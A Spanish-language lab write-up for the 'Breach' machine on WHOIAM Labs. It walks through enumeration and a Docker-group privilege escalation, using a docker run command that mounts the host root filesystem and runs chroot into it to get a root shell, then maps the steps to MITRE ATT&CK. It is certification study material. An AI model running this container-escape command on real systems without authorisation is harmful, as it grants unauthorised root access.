# Breach - WHOIAM Labs

## Información del laboratorio

- **Plataforma:** WHOIAM Labs
- **Nombre:** Breach
- **Dificultad:** ⭐☆☆☆☆☆☆☆ (Easy)
- **Categoría:** Linux Privilege Escalation
- **Objetivo:** Obtener acceso root y recuperar la flag del sistema.

---

# Objetivos

- Enumerar los servicios expuestos.
- Obtener acceso inicial al sistema.
- Realizar enumeración local.
- Escalar privilegios hasta root.
- Obtener la flag ubicada en el sistema.

---

# Reconocimiento

## Enumeración de puertos

Servicios identificados:

| Puerto | Servicio |
|---------|-----------|
| 22 | SSH |
| 80 | HTTP |

---

# Acceso inicial

Durante la enumeración de la aplicación web se identificó un recurso interno que permitió obtener acceso al usuario **devops** mediante autenticación SSH.

Usuario obtenido:

```
devops
```

---

# Enumeración local

## Usuario

```bash
whoami
id
```

Resultado:

```
uid=1000(devops)
groups=1000(devops),102(docker)
```

### Hallazgo importante

El usuario pertenece al grupo:

```
docker
```

Este grupo permite interactuar con el Docker daemon mediante el socket:

```
/var/run/docker.sock
```

---

# Verificación

Se confirmó el acceso al daemon Docker.

```bash
which docker

docker ps

docker images

ls -l /var/run/docker.sock
```

Resultado:

```
docker.sock accesible
```

---

# Escalada de privilegios

Como el usuario tenía permisos sobre Docker, fue posible descargar una imagen de Alpine y montar el sistema de archivos raíz.

```bash
docker pull alpine
```

Posteriormente:

```bash
docker run --rm -it \
-v /:/mnt \
alpine \
chroot /mnt /bin/sh
```

Una vez ejecutado:

```bash
whoami
```

Resultado:

```
root
```

---

# Obtención de la flag

La flag se encontraba dentro del directorio del usuario root.

```bash
cd /root
ls -la
cat flag.txt
```

---

# Técnicas utilizadas

- Linux Enumeration
- SSH
- Docker Enumeration
- Docker Privilege Escalation
- chroot
- Docker Socket Abuse

---

# MITRE ATT&CK

| Técnica | ID |
|----------|----|
| Valid Accounts | T1078 |
| Account Discovery | T1087 |
| Permission Groups Discovery | T1069 |
| Container Administration Command | T1609 |
| Escape to Host | T1611 |

---

# Lecciones aprendidas

- Siempre ejecutar `id` inmediatamente después de obtener acceso.
- La pertenencia al grupo **docker** puede equivaler a privilegios de root.
- Verificar siempre:
  - `sudo -l`
  - `id`
  - `getcap`
  - `find / -perm -4000`
- Docker puede utilizarse para montar el sistema de archivos del host y obtener acceso privilegiado mediante `chroot`.

---

# Comandos importantes

```bash
id

which docker

docker ps

docker images

docker pull alpine

docker run --rm -it -v /:/mnt alpine chroot /mnt /bin/sh
```

---

# Dificultad

⭐☆☆☆☆☆☆☆ Easy

---

# Autor

José Luis Cristóbal Mateo

Preparación para la certificación **C|PENT AI**
